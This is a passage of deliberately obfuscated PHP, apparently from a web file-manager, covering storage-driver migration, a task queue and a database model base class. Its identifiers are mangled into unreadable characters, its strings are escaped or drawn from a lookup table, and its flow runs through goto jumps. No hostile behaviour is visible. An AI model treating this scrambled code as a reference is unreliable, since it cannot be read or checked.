(!$dçê×ÛŒÈé->mkfile($BÈÇ©Ú†…¬)) { if ($dçÔŸÇ»Åö) { return LNG($F±Ş¢Œåß•[1999]); } show_json(LNG($F±Ş¢Œåß•[1999]), !1); } $cÁš®·ÒçÃ[$F±Ş¢Œåß•[1077]] = $cÜŠ¦ÁÅù; goto B¨ »Ì²¹‹; FšŠö‘…è»: foreach ($cÁš®·ÒçÃ as $A˜´Å¼öë© => $a‹ÓììõºĞ) { $cÁš®·ÒçÃ[$A˜´Å¼öë©] = trim($a‹ÓììõºĞ); } $cÁš®·ÒçÃ[$F±Ş¢Œåß•[1995]] = rand_string(6); $a´×ê²ªš = $GLOBALS[$F±Ş¢Œåß•[6]][$F±Ş¢Œåß•[98]][$F±Ş¢Œåß•[800]]; goto d²ËË®¡±; cßÂö‡—ŠŸ: $F±Ş¢Œåß• =& $_SERVER[Ü˜]; $a™ÃÃè”ïï = strtolower($e«´¹¯Œ¬[$F±Ş¢Œåß•[104]]); $cÁš®·ÒçÃ = json_decode($e«´¹¯Œ¬[$F±Ş¢Œåß•[6]], !0); goto FšŠö‘…è»; f®ˆ‚ù—Ï: } public function driverListSystem() { $CìŠµ†’ˆÏ =& $_SERVER[Ü˜]; $D°‹œŞ³Ò³ = parent::listData(); $D¨×İ»ÍåÚ = array(); foreach ($D°‹œŞ³Ò³ as $B·ô œá‡›) { unset($B·ô œá‡›[$CìŠµ†’ˆÏ[204]], $B·ô œá‡›[$CìŠµ†’ˆÏ[94]]); $B·ô œá‡›[$CìŠµ†’ˆÏ[6]] = json_decode($B·ô œá‡›[$CìŠµ†’ˆÏ[6]], !0); $D¨×İ»ÍåÚ[] = $B·ô œá‡›; } return $D¨×İ»ÍåÚ; } public function defaultDriver() { $bÔ»ÒÊ¼ =& $_SERVER[Ü˜]; $b”Èâ¥ç† = parent::listData(); $CÇ®„·˜Íã = array_filter_by_field($b”Èâ¥ç†, $bÔ»ÒÊ¼[34], 1); $CÇ®„·˜Íã = $CÇ®„·˜Íã[0]; if ($CÇ®„·˜Íã) { $CÇ®„·˜Íã[$bÔ»ÒÊ¼[6]] = json_decode($CÇ®„·˜Íã[$bÔ»ÒÊ¼[6]], !0); } return $CÇ®„·˜Íã; } public function driverInfo($E˜›Ö™ÃÌ) { $A¸ÔôğÃ…“ =& $_SERVER[Ü˜]; $EöİóÂƒÓ = array_to_keyvalue(parent::listData(), $A¸ÔôğÃ…“[402]); if (!isset($EöİóÂƒÓ[$E˜›Ö™ÃÌ])) { return !1; } $e©’˜òá¶ = $EöİóÂƒÓ[$E˜›Ö™ÃÌ]; $e©’˜òá¶[$A¸ÔôğÃ…“[6]] = json_decode($e©’˜òá¶[$A¸ÔôğÃ…“[6]], !0); return $e©’˜òá¶; } public function remove($a²Á‚¯£ßá) { $this->removeShareItems($a²Á‚¯£ßá); return parent::remove($a²Á‚¯£ßá); } public function removeWithFile($E¨†¡¤ŠÆ, $f†æĞ‚Ï›„) { goto A¹×ªÌğ«í; fç“¼ÙÌ±«: if (!$EÀ°‘…Ë±ª) { $f×ÎÒÍôò->stop($F”›¨àó); return !1; } $f×ÎÒÍôò->end(); if ($f†æĞ‚Ï›„ == $C°°ïõ˜[1659]) { $this->remove($E¨†¡¤ŠÆ); } goto c®åÑßµ¸†; f†í“Å”: $f©ÃŸÄ„½ = "\x7b\x69\157\72{$bàÄ¶Êé¡}\x7d\57"; $EÀ°‘…Ë±ª = !0; $f¸øÕÕ« Æ = array(); goto dñ‚Ïğ±Ö ; A¹×ªÌğ«í: $C°°ïõ˜ =& $_SERVER[Ü˜]; $DØò—Õ‚†² = array($C°°ïõ˜[791] => $E¨†¡¤ŠÆ); $B¦ùÒÉÜˆ = Model($C°°ïõ˜[459])->where($DØò—Õ‚†²)->count(); goto bø‹¢µóïØ; a„¨Š¼ˆøä: $f×ÎÒÍôò->task[$C°°ïõ˜[732]] = (double) $a¹äß„Úáâ; $C´Ø’íªİ• = KodIO::defaultDriver(); $bàÄ¶Êé¡ = $C´Ø’íªİ•[$C°°ïõ˜[402]]; goto f†í“Å”; dñ‚Ïğ±Ö : $fÓÍ¯‡¾À = Model($C°°ïõ˜[203])->where($DØò—Õ‚†²)->field($C°°ïõ˜[2004])->select(); foreach ($fÓÍ¯‡¾À as $bèÁ’ôÕÂˆ) { goto fˆµå‡â; B»ƒÄèäî: $F›¬ç›²²¦ = array($C°°ïõ˜[791] => $bàÄ¶Êé¡, $C°°ïõ˜[86] => $F‚¯Œ¥íÕÏ); Model($C°°ïõ˜[203])->where($DØò—Õ‚†²)->save($F›¬ç›²²¦); goto C¶Ñä¯òÌğ; fˆµå‡â: $AÜÜà¨¢¹ = $bèÁ’ôÕÂˆ[$C°°ïõ˜[86]]; $F‚¯Œ¥íÕÏ = $f©ÃŸÄ„½ . str_replace("\x7b\151\157\x3a{$E¨†¡¤ŠÆ}\175\x2f", $C°°ïõ˜[33], $AÜÜà¨¢¹); if (!IO::exist($AÜÜà¨¢¹)) { $f¸øÕÕ« Æ[] = $bèÁ’ôÕÂˆ[$C°°ïõ˜[456]]; $f×ÎÒÍôò->updateFileEnd($bèÁ’ôÕÂˆ[$C°°ïõ˜[28]], $bèÁ’ôÕÂˆ[$C°°ïõ˜[88]]); continue; } goto AÄÙÛœ‹Ù¨; AÄÙÛœ‹Ù¨: if (IO::exist($F‚¯Œ¥íÕÏ)) { $f×ÎÒÍôò->updateFileEnd($bèÁ’ôÕÂˆ[$C°°ïõ˜[28]], $bèÁ’ôÕÂˆ[$C°°ïõ˜[88]]); continue; } if (!IO::move($AÜÜà¨¢¹, get_path_father($F‚¯Œ¥íÕÏ))) { $EÀ°‘…Ë±ª = !1; break; } $DØò—Õ‚†² = array($C°°ïõ˜[456] => $bèÁ’ôÕÂˆ[$C°°ïõ˜[456]]); goto B»ƒÄèäî; C¶Ñä¯òÌğ: } $this->removeByFileID($f¸øÕÕ« Æ); goto fç“¼ÙÌ±«; bø‹¢µóïØ: $a¹äß„Úáâ = Model($C°°ïõ˜[459])->where($DØò—Õ‚†²)->sum($C°°ïõ˜[88]); $F”›¨àó = $f†æĞ‚Ï›„ . $C°°ïõ˜[2002] . $E¨†¡¤ŠÆ; $f×ÎÒÍôò = new TaskFileTransfer($F”›¨àó, $C°°ïõ˜[1998], $B¦ùÒÉÜˆ, LNG($C°°ïõ˜[2003]) . "\x28{$E¨†¡¤ŠÆ}\51"); goto a„¨Š¼ˆøä; c®åÑßµ¸†: } public function progress($Dšà„·Å‚¶, $ağ±”ÆôÃ) { return Task::get($ağ±”ÆôÃ . $_SERVER[Ü˜][2002] . $Dšà„·Å‚¶); } private function removeByFileID($e»í¨©¿ºŠ = array()) { goto f•ÒëÄ˜É¶; f•ÒëÄ˜É¶: $bŠí°¾ÉŠ¶ =& $_SERVER[Ü˜]; if (empty($e»í¨©¿ºŠ)) { return; } $EååÊôé–š = array($bŠí°¾ÉŠ¶[456] => array($bŠí°¾ÉŠ¶[7], $e»í¨©¿ºŠ)); goto céô’²†Šá; e‹ŞëÌ†Ğ·: foreach ($b°ÆŒ™ª‡÷ as $eøˆë¤ñšİ) { Model($bŠí°¾ÉŠ¶[418])->removeNow($eøˆë¤ñšİ, !1); } goto bÖÙ»‡ºåÅ; céô’²†Šá: $b°ÆŒ™ª‡÷ = Model($bŠí°¾ÉŠ¶[1207])->where($EååÊôé–š)->field($bŠí°¾ÉŠ¶[404])->select(); if (!$b°ÆŒ™ª‡÷) { return; } $b°ÆŒ™ª‡÷ = array_to_keyvalue($b°ÆŒ™ª‡÷, $bŠí°¾ÉŠ¶[33], $bŠí°¾ÉŠ¶[404]); goto e‹ŞëÌ†Ğ·; bÖÙ»‡ºåÅ: } private function removeShareItems($DÂëí‚èœó) { goto aŒ‚ÇÊ«; DÁˆ£Ëíİ¹: $B®Ä„à…£İ = Model($dÚ‰¦ËºÅ[1670])->where($bÃÍ²‘ã®İ)->field($dÚ‰¦ËºÅ[477])->select(); if (empty($B®Ä„à…£İ)) { return; } $Fõ¯¨‹ª‚ = array_to_keyvalue($B®Ä„à…£İ, $dÚ‰¦ËºÅ[33], $dÚ‰¦ËºÅ[477]); goto f™²Í†íÚÚ; f™²Í†íÚÚ: Model($dÚ‰¦ËºÅ[572])->remove($Fõ¯¨‹ª‚); goto c«‹‹Õà±Ø; aŒ‚ÇÊ«: $dÚ‰¦ËºÅ =& $_SERVER[Ü˜]; $EŸÎ»È”È = "\x7b\151\x6f\72{$DÂëí‚èœó}\x7d\x2f"; $bÃÍ²‘ã®İ = array($dÚ‰¦ËºÅ[404] => 0, $dÚ‰¦ËºÅ[1072] => array($dÚ‰¦ËºÅ[389], "{$EŸÎ»È”È}\45")); goto DÁˆ£Ëíİ¹; c«‹‹Õà±Ø: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\114\x69\x67\150\x74\x41\x70\x70"; public $modelType = "\x53\x79\163\x74\145\x6d\117\160\x74\x69\x6f\x6e"; public $field = array("\156\x61\x6d\x65", "\x67\162\x6f\165\160", "\144\145\x73\x63", "\143\157\156\x74\145\x6e\x74"); public function listData($CºÁ”±¬Œò = false, $F«âÏÏÁ…¾ = "\x6d\157\144\x69\x66\171\x54\151\x6d\x65", $DÇÓÍØÔ†­ = true) { return parent::listData($CºÁ”±¬Œò, $F«âÏÏÁ…¾, $DÇÓÍØÔ†­); } public function remove($FµÊÄÎ¶Š) { $EŸ‘Éƒ¤ó¸ = $this->findByName($FµÊÄÎ¶Š); if (!$EŸ‘Éƒ¤ó¸) { return !1; } return parent::remove($EŸ‘Éƒ¤ó¸[$_SERVER[Ü˜][402]]); } public function add($cŒÎ½õà) { if ($this->findByName($cŒÎ½õà[$_SERVER[Ü˜][28]])) { return !1; } return parent::insert($cŒÎ½õà); } public function update($FÓˆ¯Í‰¯¨, $EŞËÍ„å) { $Bæë˜óÏÆã =& $_SERVER[Ü˜]; $b‹ğ³ªñ = $this->findByName($FÓˆ¯Í‰¯¨); $cÍ¨†Ñƒ† = $this->findByName($EŞËÍ„å[$Bæë˜óÏÆã[28]]); if (!$b‹ğ³ªñ || $cÍ¨†Ñƒ† && $cÍ¨†Ñƒ†[$Bæë˜óÏÆã[402]] != $b‹ğ³ªñ[$Bæë˜óÏÆã[402]]) { return !1; } return parent::update($b‹ğ³ªñ[$Bæë˜óÏÆã[402]], $EŞËÍ„å); } } goto d”â§ßéÖ¿; aÁºšÏÎ¢: class TaskHttp extends Task { protected function startAfter() { $BìÄöË– =& $_SERVER[Ü˜]; $A¢ª„ê“‘Ë =& $this->task; $A¢ª„ê“‘Ë[$BìÄöË–[1593]] = 1; Hook::bind($BìÄöË–[1565], array($this, $BìÄöË–[1594])); Hook::bind($BìÄöË–[1567], array($this, $BìÄöË–[1595])); Hook::bind($BìÄöË–[1569], array($this, $BìÄöË–[1596])); } protected function endAfter() { $D¥³Ç£¼¶· =& $_SERVER[Ü˜]; Hook::unbind($D¥³Ç£¼¶·[1565], array($this, $D¥³Ç£¼¶·[1594])); Hook::unbind($D¥³Ç£¼¶·[1567], array($this, $D¥³Ç£¼¶·[1595])); Hook::unbind($D¥³Ç£¼¶·[1569], array($this, $D¥³Ç£¼¶·[1596])); } public function progressStart($aºÛÔÄêÁ±) { $B÷®ğ÷¼ =& $_SERVER[Ü˜]; $Dš˜¡ÑÅÅß = curl_getinfo($aºÛÔÄêÁ±); self::log($B÷®ğ÷¼[1597] . $Dš˜¡ÑÅÅß[$B÷®ğ÷¼[314]]); self::valueSet($this->task[$B÷®ğ÷¼[402]], $this->task); } public function progressEnd($f÷ÍÍçëä‡) { $côİõí“± =& $_SERVER[Ü˜]; self::log($côİõí“±[1598] . $this->task[$côİõí“±[402]]); $this->end(); } public function progress($Dö®Û¼‘Ï‡, $eÌøñŠöåÑ, $DƒˆƒŞÙÎ, $FÌ²…´–, $E®¯¹º‹ã¸) { $eŠ­Ï½±ËŠ =& $_SERVER[Ü˜]; $F†ÙÖË†©¿ =& $this->task; if ($E®¯¹º‹ã¸ > 0) { $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1022]] = $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1022]] == 0 ? $FÌ²…´– : $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1022]]; $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1037]] = $E®¯¹º‹ã¸; } else { if ($DƒˆƒŞÙÎ > 0) { $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1022]] = $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1022]] == 0 ? $eÌøñŠöåÑ : $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1022]]; $F†ÙÖË†©¿[$eŠ­Ï½±ËŠ[1037]] = $DƒˆƒŞÙÎ; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\x73\163\110\164\x74\x70\72\x64\157\x77\156\72{$DƒˆƒŞÙÎ}\57{$eÌøñŠöåÑ}\x3b\40\165\160\x6c\157\x61\x64\72{$E®¯¹º‹ã¸}\57{$FÌ²…´–}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\x61\163\x6b\121\165\145\165\x65\x4c\145\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\141\x73\x6b\121\x75\x65\x75\x65\x44\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($AíÑåµÜÌ•, $cÚÎÛ“±² = array(), $dŒµ«é¥ = '', $Eù†ÎÜ¦®ñ = '') { $Eô¾ƒÒµ‹‹ =& $_SERVER[Ü˜]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Eù†ÎÜ¦®ñ && array_find_by_field(self::$listData, $Eô¾ƒÒµ‹‹[103], $Eù†ÎÜ¦®ñ)) { return !0; } self::$listData[] = array($Eô¾ƒÒµ‹‹[271] => $AíÑåµÜÌ•, $Eô¾ƒÒµ‹‹[1599] => $cÚÎÛ“±², $Eô¾ƒÒµ‹‹[440] => $dŒµ«é¥, $Eô¾ƒÒµ‹‹[103] => $Eù†ÎÜ¦®ñ); return !0; } public static function addSubmit() { $B½¸¿¿ˆâÏ =& $_SERVER[Ü˜]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($B½¸¿¿ˆâÏ[1600] . json_encode_force(array_to_keyvalue(self::$listData, $B½¸¿¿ˆâÏ[33], $B½¸¿¿ˆâÏ[440])), $B½¸¿¿ˆâÏ[1601]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($cù©…ªâîÔ, $Aù·œØÃ¸ = array(), $B–“œ™Ğ¯Ù = '', $AËÇÌ©±êƒ = '') { goto AŞÁ®»¹‹¡; AŞÁ®»¹‹¡: $bĞÍÉ«¾¢ˆ =& $_SERVER[Ü˜]; if (self::count() >= self::MAX_LENGTH) { return !1; } $b“†¹“ãŞ = self::getAll(); goto bÂÀ‰ªŞ¦ö; bÂÀ‰ªŞ¦ö: if ($AËÇÌ©±êƒ && array_find_by_field($b“†¹“ãŞ, $bĞÍÉ«¾¢ˆ[103], $AËÇÌ©±êƒ)) { return !0; } $b“†¹“ãŞ[] = array($bĞÍÉ«¾¢ˆ[271] => $cù©…ªâîÔ, $bĞÍÉ«¾¢ˆ[1599] => $Aù·œØÃ¸, $bĞÍÉ«¾¢ˆ[440] => $B–“œ™Ğ¯Ù, $bĞÍÉ«¾¢ˆ[103] => $AËÇÌ©±êƒ); write_log($bĞÍÉ«¾¢ˆ[1600] . $B–“œ™Ğ¯Ù, $bĞÍÉ«¾¢ˆ[1601]); goto F‚çÄİà ; F‚çÄİà : self::setAll($b“†¹“ãŞ); return !0; goto D—à®ÄÒëÂ; D—à®ÄÒëÂ: } public static function run() { goto CÓ±œÄ¢ö; d«¸èƒŞƒ: try { Hook::apply($fó­å¢ò[$eæ›ÀƒºŒ×[271]], $fó­å¢ò[$eæ›ÀƒºŒ×[1599]]); } catch (Exception $b¯ï™ò÷×Ò) { } $EÀæ»¢¯òä = number_format(timeFloat() - $F¡—“ó¾ğ’, 3) . $eæ›ÀƒºŒ×[1542]; write_log($eæ›ÀƒºŒ×[1602] . $fó­å¢ò[$eæ›ÀƒºŒ×[440]] . $eæ›ÀƒºŒ×[1603] . $EÀæ»¢¯òä, $eæ›ÀƒºŒ×[1601]); goto dÎ²ïõ§Ş; dÎ²ïõ§Ş: return !0; goto FˆÇ¯—‡ˆå; CÓ±œÄ¢ö: $eæ›ÀƒºŒ× =& $_SERVER[Ü˜]; $cÔö¨‡Î¨ = self::getAll(); $fó­å¢ò = array_shift($cÔö¨‡Î¨); goto FŞ‹â‘öîÒ; FŞ‹â‘öîÒ: if (!$fó­å¢ò) { return !1; } self::setAll($cÔö¨‡Î¨); $F¡—“ó¾ğ’ = timeFloat(); goto d«¸èƒŞƒ; FˆÇ¯—‡ˆå: } public static function count() { $f‡ĞÚáĞ¥ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$f‡ĞÚáĞ¥) { return 0; } return intval($f‡ĞÚáĞ¥); } public static function getAll() { $fë‡Ñ’Ïñ† = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$fë‡Ñ’Ïñ†) { return array(); } return $fë‡Ñ’Ïñ†; } public static function setAll($fˆ˜š¥“À©) { $D§À”Ø¼°  = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($fˆ˜š¥“À©), $D§À”Ø¼° ); Cache::set(self::QUEUE_DATA, $fˆ˜š¥“À©, $D§À”Ø¼° ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($B–£•¤ò›, $Ağ•î¿¦ô¹ = 5.0) { if (!$B–£•¤ò›) { return; } $AŒÏº¹‘ØÂ = Cache::get($B–£•¤ò›); if (!$AŒÏº¹‘ØÂ || timeFloat() - floatVal($AŒÏº¹‘ØÂ) >= $Ağ•î¿¦ô¹) { Cache::set($B–£•¤ò›, timeFloat(), $Ağ•î¿¦ô¹ * 10); return !0; } return !1; } public static function timeLimitCall($cÁÃ†»†¥, $E‰¤ÃŸ‘Ôİ, $aÅˆƒ¤•Í, $eÄ¼÷÷é¼ = 5.0) { goto DŒ˜Ù±ÄÏâ; Eñæ£¶‚å¬: Cache::set($b•¥ÒÉìÈ, $E’øÂã‡, 60); Cache::removeMemory($b•¥ÒÉìÈ); write_log($AŠÑÂ‹§™ä[1607] . $cÁÃ†»†¥ . $AŠÑÂ‹§™ä[78] . $E‰¤ÃŸ‘Ôİ, $AŠÑÂ‹§™ä[1601]); goto FÚ˜ÂŒ÷¼Å; Fî…³¾â‚ƒ: if (is_array($E’øÂã‡[$cÁÃ†»†¥])) { $bŠôÚÅÈìÇ[$AŠÑÂ‹§™ä[1606]] = $E’øÂã‡[$cÁÃ†»†¥][$AŠÑÂ‹§™ä[1606]]; } if (is_array($E’øÂã‡[$cÁÃ†»†¥])) { if (timeFloat() - $E’øÂã‡[$cÁÃ†»†¥][$AŠÑÂ‹§™ä[1605]] < $bŠôÚÅÈìÇ[$AŠÑÂ‹§™ä[207]] * 0.3) { return; } $bŠôÚÅÈìÇ[$AŠÑÂ‹§™ä[1606]] = $E’øÂã‡[$cÁÃ†»†¥][$AŠÑÂ‹§™ä[1606]]; } $E’øÂã‡[$cÁÃ†»†¥] = $bŠôÚÅÈìÇ; goto Eñæ£¶‚å¬; DŒ˜Ù±ÄÏâ: $AŠÑÂ‹§™ä =& $_SERVER[Ü˜]; if (!$cÁÃ†»†¥ || !$E‰¤ÃŸ‘Ôİ) { return; } self::$asyncAdd = !0; goto fà´Šßğ¥é; fà´Šßğ¥é: $b•¥ÒÉìÈ = $AŠÑÂ‹§™ä[1604]; $E’øÂã‡ = Cache::get($b•¥ÒÉìÈ, !0); $bŠôÚÅÈìÇ = array($AŠÑÂ‹§™ä[1605] => timeFloat(), $AŠÑÂ‹§™ä[1606] => timeFloat(), $AŠÑÂ‹§™ä[271] => $E‰¤ÃŸ‘Ôİ, $AŠÑÂ‹§™ä[1599] => $aÅˆƒ¤•Í, $AŠÑÂ‹§™ä[207] => $eÄ¼÷÷é¼); goto Fî…³¾â‚ƒ; FÚ˜ÂŒ÷¼Å: } public static function timeLimitCallLoop() { goto FÜäãñ…¡; bÌãïÄàÔÕ: $eÔÆÒí‹‰¼ = array(); foreach ($A¹˜ÙŞ›ç– as $Eò ˜ŒÆ¤ => $aÎÀ¥˜……ï) { if ($e®¡ÒŠÓ«• - $aÎÀ¥˜……ï[$Aˆ¶­ˆ–ÂÚ[1606]] > $aÎÀ¥˜……ï[$Aˆ¶­ˆ–ÂÚ[207]]) { $a×¥Ÿ¡ñ©Ç = !0; try { Hook::apply($aÎÀ¥˜……ï[$Aˆ¶­ˆ–ÂÚ[271]], $aÎÀ¥˜……ï[$Aˆ¶­ˆ–ÂÚ[1599]]); write_log($Aˆ¶­ˆ–ÂÚ[1609] . $Eò ˜ŒÆ¤ . $Aˆ¶­ˆ–ÂÚ[78] . $aÎÀ¥˜……ï[$Aˆ¶­ˆ–ÂÚ[271]] . $Aˆ¶­ˆ–ÂÚ[1610] . ACTION, $Aˆ¶­ˆ–ÂÚ[1601]); } catch (Exception $B÷ôÖ«æ˜Ÿ) { } continue; } $eÔÆÒí‹‰¼[$Eò ˜ŒÆ¤] = $aÎÀ¥˜……ï; } if (!$a×¥Ÿ¡ñ©Ç) { return; } goto aÊô îÛ ; FœÎ”ÆãË: if (!$A¹˜ÙŞ›ç– || count($A¹˜ÙŞ›ç–) <= 0) { return; } $a×¥Ÿ¡ñ©Ç = !1; $e®¡ÒŠÓ«• = timeFloat(); goto bÌãïÄàÔÕ; eÔ ®óÊµó: if (!$fÛ¯¡’çÖ¸ && !self::$asyncAdd) { return; } $d¨¶ëÔÅê¶ = $Aˆ¶­ˆ–ÂÚ[1604]; $A¹˜ÙŞ›ç– = Cache::get($d¨¶ëÔÅê¶, !0); goto FœÎ”ÆãË; aÊô îÛ : if (!$eÔÆÒí‹‰¼) { return Cache::remove($d¨¶ëÔÅê¶); } Cache::set($d¨¶ëÔÅê¶, $eÔÆÒí‹‰¼, 60); Cache::removeMemory($d¨¶ëÔÅê¶); goto dœ§¢Ëç—Ü; FÜäãñ…¡: $Aˆ¶­ˆ–ÂÚ =& $_SERVER[Ü˜]; $bñ™‘ïã£ = array($Aˆ¶­ˆ–ÂÚ[1608]); $fÛ¯¡’çÖ¸ = in_array(strtolower(ACTION), $bñ™‘ïã£); goto eÔ ®óÊµó; dœ§¢Ëç—Ü: } public static function finished($D™¼†Ì£¥», $b¼èô÷ò‰™) { $C©ß¢Ê¡®Š =& $_SERVER[Ü˜]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($C©ß¢Ê¡®Š[271] => $D™¼†Ì£¥», $C©ß¢Ê¡®Š[1599] => $b¼èô÷ò‰™); } private static function finishedRun() { $Aö¢æ’Áğ˜ =& $_SERVER[Ü˜]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Aˆò‹¾ß) { try { Hook::apply($Aˆò‹¾ß[$Aö¢æ’Áğ˜[271]], $Aˆò‹¾ß[$Aö¢æ’Áğ˜[1599]]); } catch (Exception $Fœ‡…™ƒ½) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto D©œ¢ƒÂ ¹; F®šš‰Û»ª: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\124\151\155\145", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\164\54\165\160\x64\x61\x74\x65", "\146\x75\156\143\164\x69\157\156"), array("\143\x72\145\141\x74\x65\124\x69\155\145", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\156")); public function setDataAuto($EÈ¼ù”¡Ü) { $this->dataAuto = $EÈ¼ù”¡Ü; } public function __construct($dÂ•ÆÎ„˜ = '', $f…ÖÆ¡Ëäâ = '', $dõğë”¼ô = '') { parent::__construct($dÂ•ÆÎ„˜, $f…ÖÆ¡Ëäâ, $dõğë”¼ô); } public static function textEncode($f’Ç®¹¨) { if (!$f’Ç®¹¨) { return $f’Ç®¹¨; } $BÚ§Æ˜¸ïç = json_encode($f’Ç®¹¨); $BÚ§Æ˜¸ïç = preg_replace_callback($_SERVER[Ü˜][362], function ($b£¯ØŠŠÍã) { return addslashes($b£¯ØŠŠÍã[0]); }, $BÚ§Æ˜¸ïç); return json_decode($BÚ§Æ˜¸ïç); } public static function textDecode($Ağ£ÁˆÄá‡) { $D…ô¦ùœ´ù =& $_SERVER[Ü˜]; $cÕ´ÔÏñ£ = json_encode($Ağ£ÁˆÄá‡); $cÕ´ÔÏñ£ = preg_replace_callback($D…ô¦ùœ´ù[363], function ($AğŠÇ¼ˆ­¢) { return $_SERVER[Ü˜][107]; }, $cÕ´ÔÏñ£); return json_decode($cÕ´ÔÏñ£); } protected $tableMeta = array(); protected function _beforeInsert(&$B‰ÍõçÎ, $aÌ°Ç¢›Ùç) { $f‰«ª„¯ÖÖ =& $_SERVER[Ü˜]; if (!$this->checkDataAutoHas($f‰«ª„¯ÖÖ[364])) { return; } $this->dataBeforeFilter($B‰ÍõçÎ, $f‰«ª„¯ÖÖ[364]); } protected function _beforeUpdate(&$cÖ° ‘êõ, $D“‰’»ßš©) { $bôÔ¯¯ĞÓ =& $_SERVER[Ü˜]; if (!$this->checkDataAutoHas($bôÔ¯¯ĞÓ[365])) { return; } $this->dataBeforeFilter($cÖ° ‘êõ, $bôÔ¯¯ĞÓ[365]); } protected function _afterSelect(&$BØ•–œ‡—Î, $B‚–‰“åµ) { if (!is_array($BØ•–œ‡—Î)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ü˜][366])) { return; } foreach ($BØ•–œ‡—Î as &$CÖÌ¾Å„œ”) { $this->dataAfterFilter($CÖÌ¾Å„œ”); } unset($CÖÌ¾Å„œ”); } protected function _afterFind(&$EŠÌ¥¯¹œ¼, $a‡Œµ¸¯¸Ü) { if (!is_array($EŠÌ¥¯¹œ¼)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ü˜][366])) { return; } $this->dataAfterFilter($EŠÌ¥¯¹œ¼); } public function setAutoIncrement($Eø‰ÕÛ’çÁ) { $Cõ´ƒÖ¦ÕÖ = array($this->getPk() => $Eø‰ÕÛ’çÁ); $aï‡¿œ¡Û¦ = $this->data($Cõ´ƒÖ¦ÕÖ)->add(); if ($aï‡¿œ¡Û¦) { $this->delete($aï‡¿œ¡Û¦); } } public function getAutoIncrement() { $açÕˆÛ÷¸Î = $this->getTableName(); $AäÌ¾ÕÈÊ = $this->max($this->getPk()); $E¦É§ñÑµô = $this->query("\x73\150\x6f\x77\x20\164\141\x62\154\x65\40\x73\164\141\164\165\x73\40\x77\x68\145\x72\145\x20\116\x61\155\x65\x3d\47{$açÕˆÛ÷¸Î}\x27"); $Bãî§ÏœÂ± = $E¦É§ñÑµô[0][$_SERVER[Ü˜][367]]; $bµ•“Õ‚áæ = max($AäÌ¾ÕÈÊ, $Bãî§ÏœÂ±); return $bµ•“Õ‚áæ; } protected function _callBefore($A¼²‚²Ş, $BˆÀÜ¼µÌ) { return $this->cacheCallCheck($A¼²‚²Ş, $BˆÀÜ¼µÌ, !1); } protected function _callAfter($F…®ÄˆÄ³½, $DÅêëªË‚ù) { return $this->cacheCallCheck($F…®ÄˆÄ³½, $DÅêëªË‚ù, !0); } protected function cacheFunctionAlias($c’ğ©íâ‚õ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Bõ¦È­°î–, $c¦‰óƒğ, $DÛ‰éÅ®œ = false) { $A•²Èª“ˆ˜ = $this->cacheFunctionAlias($c¦‰óƒğ); if (!$A•²Èª“ˆ˜) { return; } foreach ($A•²Èª“ˆ˜ as $eòÅššÈ•æ => $aâ„ßòªóÛ) { $CšˆÚïäÔ = $aâ„ßòªóÛ[0]; $bé˜ÃìÑ‚ = explode($_SERVER[Ü˜][47], $aâ„ßòªóÛ[1]); if ($Bõ¦È­°î– == $eòÅššÈ•æ) { return $this->cacheFunctionGet($eòÅššÈ•æ, $CšˆÚïäÔ); } if ($DÛ‰éÅ®œ && in_array($Bõ¦È­°î–, $bé˜ÃìÑ‚)) { $this->cacheFunctionClear($eòÅššÈ•æ, $CšˆÚïäÔ); } } } public function cacheFunctionGet($FáÎÓêçÕç, $FÇ³Ôé¼æÜ) { $a¯øéÃÓä¯ = $this->cacheKeyMake($FáÎÓêçÕç, $FÇ³Ôé¼æÜ); $Dˆ¯ŒŞ‰ = Cache::get($a¯øéÃÓä¯); if (!is_array($Dˆ¯ŒŞ‰)) { $Dˆ¯ŒŞ‰ = call_user_func_array(array($this, $FáÎÓêçÕç), array($FÇ³Ôé¼æÜ, !0)); Cache::set($a¯øéÃÓä¯, $Dˆ¯ŒŞ‰); } return $Dˆ¯ŒŞ‰; } public function cacheFunctionClear($eÔö•—‘éÑ, $Aêä…áÜÕë) { $aá‹«–Óˆ = $Aêä…áÜÕë; if (!is_array($Aêä…áÜÕë)) { $aá‹«–Óˆ = array($Aêä…áÜÕë); } foreach ($aá‹«–Óˆ as $EÂáÅÏæë¬) { $DŸÍ…ß”ÌÓ = $this->cacheKeyMake($eÔö•—‘éÑ, $EÂáÅÏæë¬); Cache::remove($DŸÍ…ß”ÌÓ); } } private function cacheKeyMake($e®Ä¸”‰•Ã, $ešùßìè÷) { $D±²¶Î´Ãˆ =& $_SERVER[Ü˜]; return get_class($this) . 